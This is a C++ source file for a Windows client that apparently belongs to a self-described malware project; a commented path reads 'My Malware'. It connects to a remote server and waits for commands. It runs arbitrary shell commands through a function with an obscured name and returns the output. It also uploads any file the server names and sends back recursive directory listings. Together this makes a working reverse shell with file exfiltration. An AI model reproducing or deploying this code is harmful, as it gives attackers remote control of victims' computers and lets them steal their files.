//
// Created by avita on 07/08/2020.
//
#include "Connection.h"

Connection::Connection(string ip, unsigned int port) {
    Connection::ip = ip;
    Connection::port = port;


}

void Connection::sendMessage(const char *data) {
    send(sock, data, strlen(data), 0);
    return;
}


void Connection::sendFile(string path) {
    ifstream file{path, ifstream::binary};
    //unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BUFFER_SIZE + 1, 0);
    vector<char> buffer(BUFFER_SIZE + 1, 0);

    while (!file.eof()) {
        file.read(buffer.data(), BUFFER_SIZE);
        send(sock, buffer.data(), file.gcount(), 0);
    }
    file.close();
    return;
}

//void Connection::recvFile() {
//
//    string fileNumber = readFile("C:\\Users\\All Users\\My Malware\\files\\filenumber");
//    string path = "C:\\Users\\All Users\\My Malware\\files\\file_" + to_string(stoi(fileNumber) + 1);
//    writeToFile(path, to_string(stoi(fileNumber) + 1));
//    ofstream file(path, fstream::binary);
//    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BUFFER_SIZE + 1, 0);
//    int size;
//
//    while (true) {
//        size = recv(sock, buffer->data(), BUFFER_SIZE, 0);
//        if (!buffer->data() || size < 1024) {
//            file.write(buffer->data(), size);
//            file.flush();
//            file.close();
//            break;
//        }
//        file.write(buffer->data(), size);
//    }
//    return;
//}

string Connection::getAllFiles(string path) {
    string files;
    for (filesystem::directory_entry file : filesystem::recursive_directory_iterator(path)) {
        files += file.path().string() + "\n";
    }
    return files;
}

//string Connection::readFile(filesystem::path path) {
//    ifstream file{path.string(), ifstream::binary};
//    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BUFFER_SIZE + 1, 0);
//
//    while (!file.eof()) {
//        file.read(buffer->data(), BUFFER_SIZE);
//        send(sock, buffer->data(), static_cast<int>(sizeof(file.gcount())), 0);
//    }
//    file.close();
//    return buffer->data();
//}
//
//void Connection::writeToFile(filesystem::path path, string data) {
//    ofstream file{path.string(), ofstream::binary};
//    file.write(data.c_str(), sizeof(data));
//    file.flush();
//    file.close();
//    return;
//}
//

string Connection::e1(string &b1) {
    char buffer[128];
    std::string result = "";
    FILE *pipe = _popen(b1.c_str(), "r");
    if (!pipe) {
        return "There is an error with the command " + b1;
    }
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        _pclose(pipe);
        return "There is an error with the command " + b1;
    }
    _pclose(pipe);
    return result;
}


void Connection::connection() {
    WSADATA wsadata;
    WORD ver = MAKEWORD(2, 2);
    int wResult = WSAStartup(ver, &wsadata);

    if (wResult != 0) {
        cerr << "Cant start Winsock" << endl;
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        cerr << "Cant create sock" << WSAGetLastError << endl;
        WSACleanup();
        return;
    }
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);

    int connectionResult = connect(sock, (sockaddr *) &hint, sizeof(hint));

    if (connectionResult == INVALID_SOCKET) {
        cerr << "Cant connect to server" << WSAGetLastError << endl;
        closesocket(sock);
        WSACleanup();
        return;
    }

    char buf[1024];
    int bytesReceived;

    while (true) {
        cout << "Test" << endl;
        ZeroMemory(buf, 1024);
        bytesReceived = recv(sock, buf, 1024, 0);
        string command = string(buf, 0, static_cast<const unsigned int>(bytesReceived));
        cout << command << endl;

        //There is a bug when disconnecting the camera (The program crash)
        if (!command.rfind("cmd")) {
            //Deleting the first 4 (cmd ) characters from the command
            command = command.substr(4, command.size() - 1);
            //Execute the command and saving the output in output
            string output = e1(command);
            //Send the results to the server

            //If the command is not returning an output
            if (output.size() == 0) {
                send(sock, " ", 1, 0);
                continue;
            }
            send(sock, output.c_str(), output.size(), 0);
            continue;
        }
        //For quitting
        if (!command.rfind("quit")) {
            cout << "Quitting!" << endl;
            break;
        } else if (!command.rfind("recv file")) { //Sending file to the server
            command = command.substr(10, command.size() - 1);
            sendFile(command);
            continue;
        } else if (!command.rfind("get files")) {
            command = command.substr(10, command.size() - 1);
            string files = getAllFiles(command).c_str();
            sendMessage(to_string(files.size()).c_str());
            sendMessage(files.c_str());
            continue;
            //sendMessage(reinterpret_cast<const char *>(files.size()));
        }

        //The command is not exist
        string cantFind = "The command " + command + " was not found";
        sendMessage(cantFind.c_str());
        cout << sizeof(cantFind.c_str()) << endl;

    }



    //The end of the program
    closesocket(sock);
    WSACleanup();
    cout << "End of the program" << endl;
}
